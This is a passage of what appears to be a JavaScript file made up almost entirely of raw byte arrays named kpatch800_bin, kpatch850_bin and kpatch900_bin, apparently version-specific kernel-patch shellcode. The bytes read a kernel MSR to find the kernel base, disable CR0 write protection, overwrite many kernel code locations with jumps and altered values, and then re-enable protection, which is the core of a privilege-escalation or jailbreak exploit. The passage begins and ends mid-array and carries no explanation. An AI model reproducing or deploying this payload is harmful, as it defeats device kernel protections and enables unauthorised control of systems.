    0x41, 0xBA, 0xEB, 0x00, 0x00, 0x00, 0x41, 0xBB, 0xEB, 0x04, 0x00, 0x00,
    0x66, 0x89, 0x81, 0x04, 0x1E, 0x45, 0x00, 0x48, 0x81, 0xC2, 0x82, 0xF6,
    0x01, 0x00, 0xB8, 0x90, 0xE9, 0xFF, 0xFF, 0xC6, 0x81, 0xDD, 0x0A, 0x00,
    0x00, 0xEB, 0xC6, 0x81, 0x4D, 0xF7, 0x28, 0x00, 0xEB, 0xC6, 0x81, 0x91,
    0xF7, 0x28, 0x00, 0xEB, 0xC6, 0x81, 0x0D, 0xF8, 0x28, 0x00, 0xEB, 0xC6,
    0x81, 0x51, 0xF8, 0x28, 0x00, 0xEB, 0xC6, 0x81, 0xFD, 0xF9, 0x28, 0x00,
    0xEB, 0xC6, 0x81, 0xAD, 0xFE, 0x28, 0x00, 0xEB, 0xC6, 0x81, 0x7D, 0xFF,
    0x28, 0x00, 0xEB, 0x66, 0x89, 0xB1, 0xCF, 0x7C, 0x63, 0x00, 0xC7, 0x81,
    0x90, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x44, 0x89, 0x81,
    0xC6, 0x04, 0x00, 0x00, 0x66, 0x44, 0x89, 0x89, 0xBD, 0x04, 0x00, 0x00,
    0x66, 0x44, 0x89, 0x91, 0xB9, 0x04, 0x00, 0x00, 0xC6, 0x81, 0x27, 0xA3,
    0x37, 0x00, 0xEB, 0x66, 0x44, 0x89, 0x99, 0xC8, 0x14, 0x30, 0x00, 0x66,
    0x89, 0x81, 0xC4, 0x23, 0x45, 0x00, 0xC7, 0x81, 0x30, 0x9A, 0x02, 0x00,
    0x48, 0x31, 0xC0, 0xC3, 0xC6, 0x81, 0x7D, 0xB1, 0x0D, 0x00, 0x37, 0xC6,
    0x81, 0x80, 0xB1, 0x0D, 0x00, 0x37, 0xC7, 0x81, 0x50, 0x25, 0x12, 0x01,
    0x02, 0x00, 0x00, 0x00, 0x48, 0x89, 0x91, 0x58, 0x25, 0x12, 0x01, 0xC7,
    0x81, 0x7C, 0x25, 0x12, 0x01, 0x01, 0x00, 0x00, 0x00, 0x0F, 0x20, 0xC0,
    0x48, 0x0D, 0x00, 0x00, 0x01, 0x00, 0x0F, 0x22, 0xC0, 0x0F, 0x20, 0xC0,
    0x48, 0x25, 0xFF, 0xFF, 0xFE, 0xFF, 0x0F, 0x22, 0xC0, 0xB8, 0xEB, 0x03,
    0x00, 0x00, 0xBA, 0x05, 0x00, 0x00, 0x00, 0x45, 0x31, 0xC0, 0x45, 0x31,
    0xC9, 0x66, 0x89, 0x81, 0xF5, 0x20, 0x0B, 0x00, 0xBE, 0x05, 0x00, 0x00,
    0x00, 0x48, 0xB8, 0x41, 0x83, 0xBE, 0xA0, 0x04, 0x00, 0x00, 0x00, 0x41,
    0xBA, 0x01, 0x00, 0x00, 0x00, 0x48, 0x89, 0x81, 0xFA, 0x20, 0x0B, 0x00,
    0xB8, 0x04, 0x00, 0x00, 0x00, 0x41, 0xBB, 0x01, 0x00, 0x00, 0x00, 0x66,
    0x89, 0x81, 0x0C, 0x21, 0x0B, 0x00, 0xB8, 0x04, 0x00, 0x00, 0x00, 0x66,
    0x89, 0x81, 0x19, 0x21, 0x0B, 0x00, 0xB8, 0x4C, 0x89, 0xFF, 0xFF, 0xC7,
    0x81, 0x03, 0x22, 0x0B, 0x00, 0xE9, 0xF2, 0xFE, 0xFF, 0xC6, 0x81, 0x07,
    0x22, 0x0B, 0x00, 0xFF, 0xC7, 0x81, 0x08, 0x21, 0x0B, 0x00, 0x49, 0x8B,
    0x86, 0xD0, 0xC6, 0x81, 0x0E, 0x21, 0x0B, 0x00, 0x00, 0xC7, 0x81, 0x15,
    0x21, 0x0B, 0x00, 0x49, 0x8B, 0xB6, 0xB0, 0xC6, 0x81, 0x1B, 0x21, 0x0B,
    0x00, 0x00, 0xC7, 0x81, 0x2D, 0x21, 0x0B, 0x00, 0x49, 0x8B, 0x86, 0x40,
    0x66, 0x89, 0x91, 0x31, 0x21, 0x0B, 0x00, 0xC6, 0x81, 0x33, 0x21, 0x0B,
    0x00, 0x00, 0xC7, 0x81, 0x3A, 0x21, 0x0B, 0x00, 0x49, 0x8B, 0xB6, 0x20,
    0x66, 0x89, 0xB1, 0x3E, 0x21, 0x0B, 0x00, 0xC6, 0x81, 0x40, 0x21, 0x0B,
    0x00, 0x00, 0xC7, 0x81, 0x52, 0x21, 0x0B, 0x00, 0x49, 0x8D, 0xBE, 0xC0,
    0x66, 0x44, 0x89, 0x81, 0x56, 0x21, 0x0B, 0x00, 0xC6, 0x81, 0x58, 0x21,
    0x0B, 0x00, 0x00, 0xC7, 0x81, 0x5E, 0x21, 0x0B, 0x00, 0x49, 0x8D, 0xBE,
    0xE0, 0x66, 0x44, 0x89, 0x89, 0x62, 0x21, 0x0B, 0x00, 0xC6, 0x81, 0x64,
    0x21, 0x0B, 0x00, 0x00, 0xC7, 0x81, 0x71, 0x21, 0x0B, 0x00, 0x49, 0x8D,
    0xBE, 0x00, 0x66, 0x44, 0x89, 0x91, 0x75, 0x21, 0x0B, 0x00, 0xC6, 0x81,
    0x77, 0x21, 0x0B, 0x00, 0x00, 0xC7, 0x81, 0x7D, 0x21, 0x0B, 0x00, 0x49,
    0x8D, 0xBE, 0x20, 0x66, 0x44, 0x89, 0x99, 0x81, 0x21, 0x0B, 0x00, 0xC6,
    0x81, 0x83, 0x21, 0x0B, 0x00, 0x00, 0x66, 0x89, 0x81, 0x8E, 0x21, 0x0B,
    0x00, 0xC6, 0x81, 0x90, 0x21, 0x0B, 0x00, 0xF7, 0x0F, 0x20, 0xC0, 0x48,
    0x0D, 0x00, 0x00, 0x01, 0x00, 0x0F, 0x22, 0xC0, 0x48, 0x8B, 0x57, 0x08,
    0x48, 0x8B, 0x47, 0x10, 0x48, 0x89, 0xD6, 0x4C, 0x8D, 0x40, 0x01, 0x4C,
    0x29, 0xC6, 0x48, 0x83, 0xFE, 0x0E, 0x76, 0x6D, 0xF3, 0x0F, 0x6F, 0x00,
    0x0F, 0x11, 0x02, 0x48, 0x8B, 0x40, 0x10, 0x48, 0x89, 0x42, 0x10, 0x48,
    0x8B, 0x47, 0x18, 0x48, 0xC7, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B,
    0x47, 0x20, 0x48, 0xC7, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x47,
    0x28, 0x48, 0x8B, 0x10, 0x48, 0x89, 0x91, 0x30, 0x9F, 0x12, 0x01, 0x48,
    0x8B, 0x50, 0x08, 0x48, 0x89, 0x91, 0x38, 0x9F, 0x12, 0x01, 0x48, 0x8B,
    0x50, 0x10, 0x48, 0x89, 0x91, 0x40, 0x9F, 0x12, 0x01, 0x48, 0x8B, 0x50,
    0x18, 0x48, 0x89, 0x91, 0x48, 0x9F, 0x12, 0x01, 0x48, 0x8B, 0x50, 0x20,
    0x48, 0x89, 0x91, 0x50, 0x9F, 0x12, 0x01, 0x48, 0x8B, 0x40, 0x28, 0x48,
    0x89, 0x81, 0x58, 0x9F, 0x12, 0x01, 0x31, 0xC0, 0xC3, 0x4C, 0x8D, 0x40,
    0x18, 0x48, 0x29, 0xC2, 0x0F, 0x1F, 0x40, 0x00, 0x0F, 0xB6, 0x30, 0x40,
    0x88, 0x34, 0x02, 0x48, 0x83, 0xC0, 0x01, 0x49, 0x39, 0xC0, 0x75, 0xF0,
    0xEB, 0x85
  ]);
  const kpatch800_bin = new Uint8Array([
    0xB9, 0x82, 0x00, 0x00, 0xC0, 0x48, 0x89, 0xF7, 0x0F, 0x32, 0x48, 0xC1,
    0xE2, 0x20, 0x89, 0xC0, 0x48, 0x09, 0xC2, 0x48, 0x8D, 0x8A, 0x40, 0xFE,
    0xFF, 0xFF, 0x0F, 0x20, 0xC0, 0x48, 0x25, 0xFF, 0xFF, 0xFE, 0xFF, 0x0F,
    0x22, 0xC0, 0xB8, 0xEB, 0x00, 0x00, 0x00, 0xBE, 0xEB, 0x00, 0x00, 0x00,
    0x41, 0xB8, 0xEB, 0x00, 0x00, 0x00, 0x41, 0xB9, 0xEB, 0x00, 0x00, 0x00,
    0x41, 0xBA, 0xEB, 0x04, 0x00, 0x00, 0x41, 0xBB, 0x90, 0xE9, 0xFF, 0xFF,
    0x48, 0x81, 0xC2, 0xDC, 0x60, 0x0E, 0x00, 0x66, 0x89, 0x81, 0x54, 0xD2,
    0x62, 0x00, 0xC6, 0x81, 0xCD, 0x0A, 0x00, 0x00, 0xEB, 0xC6, 0x81, 0x0D,
    0xE1, 0x25, 0x00, 0xEB, 0xC6, 0x81, 0x51, 0xE1, 0x25, 0x00, 0xEB, 0xC6,
    0x81, 0xCD, 0xE1, 0x25, 0x00, 0xEB, 0xC6, 0x81, 0x11, 0xE2, 0x25, 0x00,
    0xEB, 0xC6, 0x81, 0xBD, 0xE3, 0x25, 0x00, 0xEB, 0xC6, 0x81, 0x6D, 0xE8,
    0x25, 0x00, 0xEB, 0xC6, 0x81, 0x3D, 0xE9, 0x25, 0x00, 0xEB, 0x66, 0x89,
    0xB1, 0x3F, 0xDB, 0x62, 0x00, 0xC7, 0x81, 0x90, 0x04, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0xC6, 0x81, 0xC2, 0x04, 0x00, 0x00, 0xEB, 0x66, 0x44,
    0x89, 0x81, 0xB9, 0x04, 0x00, 0x00, 0x66, 0x44, 0x89, 0x89, 0xB5, 0x04,
    0x00, 0x00, 0xC6, 0x81, 0x96, 0xD6, 0x34, 0x00, 0xEB, 0x66, 0x44, 0x89,
    0x91, 0x8B, 0xC6, 0x3E, 0x00, 0x66, 0x44, 0x89, 0x99, 0x84, 0x8D, 0x31,
    0x00, 0xC6, 0x81, 0x3F, 0x95, 0x31, 0x00, 0xEB, 0xC7, 0x81, 0xC0, 0x51,
    0x09, 0x00, 0x48, 0x31, 0xC0, 0xC3, 0xC6, 0x81, 0x3A, 0xD0, 0x0F, 0x00,
    0x37, 0xC6, 0x81, 0x3D, 0xD0, 0x0F, 0x00, 0x37, 0xC7, 0x81, 0xE0, 0xC6,
    0x0F, 0x01, 0x02, 0x00, 0x00, 0x00, 0x48, 0x89, 0x91, 0xE8, 0xC6, 0x0F,
    0x01, 0xC7, 0x81, 0x0C, 0xC7, 0x0F, 0x01, 0x01, 0x00, 0x00, 0x00, 0x0F,
    0x20, 0xC0, 0x48, 0x0D, 0x00, 0x00, 0x01, 0x00, 0x0F, 0x22, 0xC0, 0x0F,
    0x20, 0xC0, 0x48, 0x25, 0xFF, 0xFF, 0xFE, 0xFF, 0x0F, 0x22, 0xC0, 0xB8,
    0xEB, 0x48, 0x00, 0x00, 0xBA, 0x05, 0x00, 0x00, 0x00, 0x31, 0xF6, 0x45,
    0x31, 0xC0, 0x66, 0x89, 0x81, 0x41, 0xF1, 0x09, 0x00, 0xB8, 0xEB, 0x06,
    0x00, 0x00, 0x41, 0xB9, 0x01, 0x00, 0x00, 0x00, 0x41, 0xBA, 0x01, 0x00,
    0x00, 0x00, 0x66, 0x89, 0x81, 0x83, 0xF1, 0x09, 0x00, 0x41, 0xBB, 0x49,
    0x8B, 0xFF, 0xFF, 0x48, 0xB8, 0x41, 0x83, 0xBF, 0xA0, 0x04, 0x00, 0x00,
    0x00, 0x48, 0x89, 0x81, 0x8B, 0xF1, 0x09, 0x00, 0xB8, 0x04, 0x00, 0x00,
    0x00, 0x66, 0x89, 0x81, 0x9D, 0xF1, 0x09, 0x00, 0xB8, 0x04, 0x00, 0x00,
    0x00, 0x66, 0x89, 0x81, 0xAA, 0xF1, 0x09, 0x00, 0xB8, 0x05, 0x00, 0x00,
    0x00, 0xC7, 0x81, 0x99, 0xF1, 0x09, 0x00, 0x49, 0x8B, 0x87, 0xD0, 0xC6,
    0x81, 0x9F, 0xF1, 0x09, 0x00, 0x00, 0xC7, 0x81, 0xA6, 0xF1, 0x09, 0x00,
    0x49, 0x8B, 0xB7, 0xB0, 0xC6, 0x81, 0xAC, 0xF1, 0x09, 0x00, 0x00, 0xC7,
    0x81, 0xBE, 0xF1, 0x09, 0x00, 0x49, 0x8B, 0x87, 0x40, 0x66, 0x89, 0x81,
    0xC2, 0xF1, 0x09, 0x00, 0xC6, 0x81, 0xC4, 0xF1, 0x09, 0x00, 0x00, 0xC7,
    0x81, 0xCB, 0xF1, 0x09, 0x00, 0x49, 0x8B, 0xB7, 0x20, 0x66, 0x89, 0x91,
    0xCF, 0xF1, 0x09, 0x00, 0xC6, 0x81, 0xD1, 0xF1, 0x09, 0x00, 0x00, 0xC7,
    0x81, 0xE3, 0xF1, 0x09, 0x00, 0x49, 0x8D, 0xBF, 0xC0, 0x66, 0x89, 0xB1,
    0xE7, 0xF1, 0x09, 0x00, 0xC6, 0x81, 0xE9, 0xF1, 0x09, 0x00, 0x00, 0xC7,
    0x81, 0xEF, 0xF1, 0x09, 0x00, 0x49, 0x8D, 0xBF, 0xE0, 0x66, 0x44, 0x89,
    0x81, 0xF3, 0xF1, 0x09, 0x00, 0xC6, 0x81, 0xF5, 0xF1, 0x09, 0x00, 0x00,
    0xC7, 0x81, 0x02, 0xF2, 0x09, 0x00, 0x49, 0x8D, 0xBF, 0x00, 0x66, 0x44,
    0x89, 0x89, 0x06, 0xF2, 0x09, 0x00, 0xC6, 0x81, 0x08, 0xF2, 0x09, 0x00,
    0x00, 0xC7, 0x81, 0x0E, 0xF2, 0x09, 0x00, 0x49, 0x8D, 0xBF, 0x20, 0x66,
    0x44, 0x89, 0x91, 0x12, 0xF2, 0x09, 0x00, 0xC6, 0x81, 0x14, 0xF2, 0x09,
    0x00, 0x00, 0x66, 0x44, 0x89, 0x99, 0x1F, 0xF2, 0x09, 0x00, 0xC6, 0x81,
    0x21, 0xF2, 0x09, 0x00, 0xFF, 0x0F, 0x20, 0xC0, 0x48, 0x0D, 0x00, 0x00,
    0x01, 0x00, 0x0F, 0x22, 0xC0, 0x48, 0x8B, 0x57, 0x08, 0x48, 0x8B, 0x47,
    0x10, 0x48, 0x89, 0xD6, 0x4C, 0x8D, 0x40, 0x01, 0x4C, 0x29, 0xC6, 0x48,
    0x83, 0xFE, 0x0E, 0x76, 0x6D, 0xF3, 0x0F, 0x6F, 0x00, 0x0F, 0x11, 0x02,
    0x48, 0x8B, 0x40, 0x10, 0x48, 0x89, 0x42, 0x10, 0x48, 0x8B, 0x47, 0x18,
    0x48, 0xC7, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x47, 0x20, 0x48,
    0xC7, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x47, 0x28, 0x48, 0x8B,
    0x10, 0x48, 0x89, 0x91, 0xC0, 0x40, 0x10, 0x01, 0x48, 0x8B, 0x50, 0x08,
    0x48, 0x89, 0x91, 0xC8, 0x40, 0x10, 0x01, 0x48, 0x8B, 0x50, 0x10, 0x48,
    0x89, 0x91, 0xD0, 0x40, 0x10, 0x01, 0x48, 0x8B, 0x50, 0x18, 0x48, 0x89,
    0x91, 0xD8, 0x40, 0x10, 0x01, 0x48, 0x8B, 0x50, 0x20, 0x48, 0x89, 0x91,
    0xE0, 0x40, 0x10, 0x01, 0x48, 0x8B, 0x40, 0x28, 0x48, 0x89, 0x81, 0xE8,
    0x40, 0x10, 0x01, 0x31, 0xC0, 0xC3, 0x4C, 0x8D, 0x40, 0x18, 0x48, 0x29,
    0xC2, 0x0F, 0x1F, 0x00, 0x0F, 0xB6, 0x30, 0x40, 0x88, 0x34, 0x02, 0x48,
    0x83, 0xC0, 0x01, 0x49, 0x39, 0xC0, 0x75, 0xF0, 0xEB, 0x86
  ]);
  const kpatch850_bin = new Uint8Array([
    0xB9, 0x82, 0x00, 0x00, 0xC0, 0x48, 0x89, 0xF7, 0x0F, 0x32, 0x48, 0xC1,
    0xE2, 0x20, 0x89, 0xC0, 0x48, 0x09, 0xC2, 0x48, 0x8D, 0x8A, 0x40, 0xFE,
    0xFF, 0xFF, 0x0F, 0x20, 0xC0, 0x48, 0x25, 0xFF, 0xFF, 0xFE, 0xFF, 0x0F,
    0x22, 0xC0, 0xB8, 0xEB, 0x00, 0x00, 0x00, 0xBE, 0xEB, 0x00, 0x00, 0x00,
    0x41, 0xB8, 0xEB, 0x00, 0x00, 0x00, 0x41, 0xB9, 0xEB, 0x00, 0x00, 0x00,
    0x41, 0xBA, 0xEB, 0x04, 0x00, 0x00, 0x41, 0xBB, 0x90, 0xE9, 0xFF, 0xFF,
    0x48, 0x81, 0xC2, 0x4D, 0x7F, 0x0C, 0x00, 0x66, 0x89, 0x81, 0x74, 0x46,
    0x62, 0x00, 0xC6, 0x81, 0xCD, 0x0A, 0x00, 0x00, 0xEB, 0xC6, 0x81, 0x3D,
    0x40, 0x3A, 0x00, 0xEB, 0xC6, 0x81, 0x81, 0x40, 0x3A, 0x00, 0xEB, 0xC6,
    0x81, 0xFD, 0x40, 0x3A, 0x00, 0xEB, 0xC6, 0x81, 0x41, 0x41, 0x3A, 0x00,
    0xEB, 0xC6, 0x81, 0xED, 0x42, 0x3A, 0x00, 0xEB, 0xC6, 0x81, 0x9D, 0x47,
    0x3A, 0x00, 0xEB, 0xC6, 0x81, 0x6D, 0x48, 0x3A, 0x00, 0xEB, 0x66, 0x89,
    0xB1, 0x5F, 0x4F, 0x62, 0x00, 0xC7, 0x81, 0x90, 0x04, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0xC6, 0x81, 0xC2, 0x04, 0x00, 0x00, 0xEB, 0x66, 0x44,
    0x89, 0x81, 0xB9, 0x04, 0x00, 0x00, 0x66, 0x44, 0x89, 0x89, 0xB5, 0x04,
    0x00, 0x00, 0xC6, 0x81, 0xD6, 0xF3, 0x22, 0x00, 0xEB, 0x66, 0x44, 0x89,
    0x91, 0xDB, 0xD6, 0x14, 0x00, 0x66, 0x44, 0x89, 0x99, 0x74, 0x74, 0x01,
    0x00, 0xC6, 0x81, 0x2F, 0x7C, 0x01, 0x00, 0xEB, 0xC7, 0x81, 0x40, 0xD0,
    0x3A, 0x00, 0x48, 0x31, 0xC0, 0xC3, 0xC6, 0x81, 0xEA, 0x26, 0x08, 0x00,
    0x37, 0xC6, 0x81, 0xED, 0x26, 0x08, 0x00, 0x37, 0xC7, 0x81, 0xD0, 0xC7,
    0x0F, 0x01, 0x02, 0x00, 0x00, 0x00, 0x48, 0x89, 0x91, 0xD8, 0xC7, 0x0F,
    0x01, 0xC7, 0x81, 0xFC, 0xC7, 0x0F, 0x01, 0x01, 0x00, 0x00, 0x00, 0x0F,
    0x20, 0xC0, 0x48, 0x0D, 0x00, 0x00, 0x01, 0x00, 0x0F, 0x22, 0xC0, 0x0F,
    0x20, 0xC0, 0x48, 0x25, 0xFF, 0xFF, 0xFE, 0xFF, 0x0F, 0x22, 0xC0, 0xB8,
    0xEB, 0x48, 0x00, 0x00, 0xBA, 0x05, 0x00, 0x00, 0x00, 0x31, 0xF6, 0x45,
    0x31, 0xC0, 0x66, 0x89, 0x81, 0x21, 0x02, 0x03, 0x00, 0xB8, 0xEB, 0x06,
    0x00, 0x00, 0x41, 0xB9, 0x01, 0x00, 0x00, 0x00, 0x41, 0xBA, 0x01, 0x00,
    0x00, 0x00, 0x66, 0x89, 0x81, 0x63, 0x02, 0x03, 0x00, 0x41, 0xBB, 0x49,
    0x8B, 0xFF, 0xFF, 0x48, 0xB8, 0x41, 0x83, 0xBF, 0xA0, 0x04, 0x00, 0x00,
    0x00, 0x48, 0x89, 0x81, 0x6B, 0x02, 0x03, 0x00, 0xB8, 0x04, 0x00, 0x00,
    0x00, 0x66, 0x89, 0x81, 0x7D, 0x02, 0x03, 0x00, 0xB8, 0x04, 0x00, 0x00,
    0x00, 0x66, 0x89, 0x81, 0x8A, 0x02, 0x03, 0x00, 0xB8, 0x05, 0x00, 0x00,
    0x00, 0xC7, 0x81, 0x79, 0x02, 0x03, 0x00, 0x49, 0x8B, 0x87, 0xD0, 0xC6,
    0x81, 0x7F, 0x02, 0x03, 0x00, 0x00, 0xC7, 0x81, 0x86, 0x02, 0x03, 0x00,
    0x49, 0x8B, 0xB7, 0xB0, 0xC6, 0x81, 0x8C, 0x02, 0x03, 0x00, 0x00, 0xC7,
    0x81, 0x9E, 0x02, 0x03, 0x00, 0x49, 0x8B, 0x87, 0x40, 0x66, 0x89, 0x81,
    0xA2, 0x02, 0x03, 0x00, 0xC6, 0x81, 0xA4, 0x02, 0x03, 0x00, 0x00, 0xC7,
    0x81, 0xAB, 0x02, 0x03, 0x00, 0x49, 0x8B, 0xB7, 0x20, 0x66, 0x89, 0x91,
    0xAF, 0x02, 0x03, 0x00, 0xC6, 0x81, 0xB1, 0x02, 0x03, 0x00, 0x00, 0xC7,
    0x81, 0xC3, 0x02, 0x03, 0x00, 0x49, 0x8D, 0xBF, 0xC0, 0x66, 0x89, 0xB1,
    0xC7, 0x02, 0x03, 0x00, 0xC6, 0x81, 0xC9, 0x02, 0x03, 0x00, 0x00, 0xC7,
    0x81, 0xCF, 0x02, 0x03, 0x00, 0x49, 0x8D, 0xBF, 0xE0, 0x66, 0x44, 0x89,
    0x81, 0xD3, 0x02, 0x03, 0x00, 0xC6, 0x81, 0xD5, 0x02, 0x03, 0x00, 0x00,
    0xC7, 0x81, 0xE2, 0x02, 0x03, 0x00, 0x49, 0x8D, 0xBF, 0x00, 0x66, 0x44,
    0x89, 0x89, 0xE6, 0x02, 0x03, 0x00, 0xC6, 0x81, 0xE8, 0x02, 0x03, 0x00,
    0x00, 0xC7, 0x81, 0xEE, 0x02, 0x03, 0x00, 0x49, 0x8D, 0xBF, 0x20, 0x66,
    0x44, 0x89, 0x91, 0xF2, 0x02, 0x03, 0x00, 0xC6, 0x81, 0xF4, 0x02, 0x03,
    0x00, 0x00, 0x66, 0x44, 0x89, 0x99, 0xFF, 0x02, 0x03, 0x00, 0xC6, 0x81,
    0x01, 0x03, 0x03, 0x00, 0xFF, 0x0F, 0x20, 0xC0, 0x48, 0x0D, 0x00, 0x00,
    0x01, 0x00, 0x0F, 0x22, 0xC0, 0x48, 0x8B, 0x57, 0x08, 0x48, 0x8B, 0x47,
    0x10, 0x48, 0x89, 0xD6, 0x4C, 0x8D, 0x40, 0x01, 0x4C, 0x29, 0xC6, 0x48,
    0x83, 0xFE, 0x0E, 0x76, 0x6D, 0xF3, 0x0F, 0x6F, 0x00, 0x0F, 0x11, 0x02,
    0x48, 0x8B, 0x40, 0x10, 0x48, 0x89, 0x42, 0x10, 0x48, 0x8B, 0x47, 0x18,
    0x48, 0xC7, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x47, 0x20, 0x48,
    0xC7, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x47, 0x28, 0x48, 0x8B,
    0x10, 0x48, 0x89, 0x91, 0xB0, 0x41, 0x10, 0x01, 0x48, 0x8B, 0x50, 0x08,
    0x48, 0x89, 0x91, 0xB8, 0x41, 0x10, 0x01, 0x48, 0x8B, 0x50, 0x10, 0x48,
    0x89, 0x91, 0xC0, 0x41, 0x10, 0x01, 0x48, 0x8B, 0x50, 0x18, 0x48, 0x89,
    0x91, 0xC8, 0x41, 0x10, 0x01, 0x48, 0x8B, 0x50, 0x20, 0x48, 0x89, 0x91,
    0xD0, 0x41, 0x10, 0x01, 0x48, 0x8B, 0x40, 0x28, 0x48, 0x89, 0x81, 0xD8,
    0x41, 0x10, 0x01, 0x31, 0xC0, 0xC3, 0x4C, 0x8D, 0x40, 0x18, 0x48, 0x29,
    0xC2, 0x0F, 0x1F, 0x00, 0x0F, 0xB6, 0x30, 0x40, 0x88, 0x34, 0x02, 0x48,
    0x83, 0xC0, 0x01, 0x49, 0x39, 0xC0, 0x75, 0xF0, 0xEB, 0x86
  ]);
  const kpatch900_bin = new Uint8Array([
    0xB9, 0x82, 0x00, 0x00, 0xC0, 0x48, 0x89, 0xF7, 0x0F, 0x32, 0x48, 0xC1,
    0xE2, 0x20, 0x89, 0xC0, 0x48, 0x09, 0xC2, 0x48, 0x8D, 0x8A, 0x40, 0xFE,
    0xFF, 0xFF, 0x0F, 0x20, 0xC0, 0x48, 0x25, 0xFF, 0xFF, 0xFE, 0xFF, 0x0F,
    0x22, 0xC0, 0xB8, 0xEB, 0x00, 0x00, 0x00, 0xBE, 0xEB, 0x00, 0x00, 0x00,
    0x41, 0xB8, 0xEB, 0x00, 0x00, 0x00, 0x41, 0xB9, 0xEB, 0x00, 0x00, 0x00,
    0x41, 0xBA, 0xEB, 0x04, 0x00, 0x00, 0x41, 0xBB, 0x90, 0xE9, 0xFF, 0xFF,
    0x48, 0x81, 0xC2, 0xED, 0xC5, 0x04, 0x00, 0x66, 0x89, 0x81, 0x74, 0x68,
    0x62, 0x00, 0xC6, 0x81, 0xCD, 0x0A, 0x00, 0x00, 0xEB, 0xC6, 0x81, 0xFD,
    0x13, 0x27, 0x00, 0xEB, 0xC6, 0x81, 0x41, 0x14, 0x27, 0x00, 0xEB, 0xC6,
    0x81, 0xBD, 0x14, 0x27, 0x00, 0xEB, 0xC6, 0x81, 0x01, 0x15, 0x27, 0x00,
    0xEB, 0xC6, 0x81, 0xAD, 0x16, 0x27, 0x00, 0xEB, 0xC6, 0x81, 0x5D, 0x1B,
    0x27, 0x00, 0xEB, 0xC6, 0x81, 0x2D, 0x1C, 0x27, 0x00, 0xEB, 0x66, 0x89,
    0xB1, 0x5F, 0x71, 0x62, 0x00, 0xC7, 0x81, 0x90, 0x04, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0xC6, 0x81, 0xC2, 0x04, 0x00, 0x00, 0xEB, 0x66, 0x44,
    0x89, 0x81, 0xB9, 0x04, 0x00, 0x00, 0x66, 0x44, 0x89, 0x89, 0xB5, 0x04,
    0x00, 0x00, 0xC6, 0x81, 0x06, 0x1A, 0x00, 0x00, 0xEB, 0x66, 0x44, 0x89,
    0x91, 0x8B, 0x0B, 0x08, 0x00, 0x66, 0x44, 0x89, 0x99, 0xC4, 0xAE, 0x23,
    0x00, 0xC6, 0x81, 0x7F, 0xB6, 0x23, 0x00, 0xEB, 0xC7, 0x81, 0x40, 0x1B,
    0x22, 0x00, 0x48, 0x31, 0xC0, 0xC3, 0xC6, 0x81, 0x2A, 0x63, 0x16, 0x00,
    0x37, 0xC6, 0x81, 0x2D, 0x63, 0x16, 0x00, 0x37, 0xC7, 0x81, 0x20, 0x05,
    0x10, 0x01, 0x02, 0x00, 0x00, 0x00, 0x48, 0x89, 0x91, 0x28, 0x05, 0x10,
    0x01, 0xC7, 0x81, 0x4C, 0x05, 0x10, 0x01, 0x01, 0x00, 0x00, 0x00, 0x0F,
    0x20, 0xC0, 0x48, 0x0D, 0x00, 0x00, 0x01, 0x00, 0x0F, 0x22, 0xC0, 0x0F,
    0x20, 0xC0, 0x48, 0x25, 0xFF, 0xFF, 0xFE, 0xFF, 0x0F, 0x22, 0xC0, 0xB8,
    0xEB, 0x48, 0x00, 0x00, 0xBA, 0x05, 0x00, 0x00, 0x00, 0x31, 0xF6, 0x45,
    0x31, 0xC0, 0x66, 0x89, 0x81, 0x01, 0x5A, 0x41, 0x00, 0xB8, 0xEB, 0x06,
    0x00, 0x00, 0x41, 0xB9, 0x01, 0x00, 0x00, 0x00, 0x41, 0xBA, 0x01, 0x00,
    0x00, 0x00, 0x66, 0x89, 0x81, 0x43, 0x5A, 0x41, 0x00, 0x41, 0xBB, 0x49,
    0x8B, 0xFF, 0xFF, 0x48, 0xB8, 0x41, 0x83, 0xBF, 0xA0, 0x04, 0x00, 0x00,
    0x00, 0x48, 0x89, 0x81, 0x4B, 0x5A, 0x41, 0x00, 0xB8, 0x04, 0x00, 0x00,
    0x00, 0x66, 0x89, 0x81, 0x5D, 0x5A, 0x41, 0x00, 0xB8, 0x04, 0x00, 0x00,
    0x00, 0x66, 0x89, 0x81, 0x6A, 0x5A, 0x41, 0x00, 0xB8, 0x05, 0x00, 0x00,
    0x00, 0xC7, 0x81, 0x59, 0x5A, 0x41, 0x00, 0x49, 0x8B, 0x87, 0xD0, 0xC6,
    0x81, 0x5F, 0x5A, 0x41, 0x00, 0x00, 0xC7, 0x81, 0x66, 0x5A, 0x41, 0x00,
    0x49, 0x8B, 0xB7, 0xB0, 0xC6, 0x81, 0x6C, 0x5A, 0x41, 0x00, 0x00, 0xC7,
    0x81, 0x7E, 0x5A, 0x41, 0x00, 0x49, 0x8B, 0x87, 0x40, 0x66, 0x89, 0x81,
    0x82, 0x5A, 0x41, 0x00, 0xC6, 0x81, 0x84, 0x5A, 0x41, 0x00, 0x00, 0xC7,
    0x81, 0x8B, 0x5A, 0x41, 0x00, 0x49, 0x8B, 0xB7, 0x20, 0x66, 0x89, 0x91,
    0x8F, 0x5A, 0x41, 0x00, 0xC6, 0x81, 0x91, 0x5A, 0x41, 0x00, 0x00, 0xC7,
    0x81, 0xA3, 0x5A, 0x41, 0x00, 0x49, 0x8D, 0xBF, 0xC0, 0x66, 0x89, 0xB1,
    0xA7, 0x5A, 0x41, 0x00, 0xC6, 0x81, 0xA9, 0x5A, 0x41, 0x00, 0x00, 0xC7,
    0x81, 0xAF, 0x5A, 0x41, 0x00, 0x49, 0x8D, 0xBF, 0xE0, 0x66, 0x44, 0x89,
    0x81, 0xB3, 0x5A, 0x41, 0x00, 0xC6, 0x81, 0xB5, 0x5A, 0x41, 0x00, 0x00,
    0xC7, 0x81, 0xC2, 0x5A, 0x41, 0x00, 0x49, 0x8D, 0xBF, 0x00, 0x66, 0x44,
    0x89, 0x89, 0xC6, 0x5A, 0x41, 0x00, 0xC6, 0x81, 0xC8, 0x5A, 0x41, 0x00,
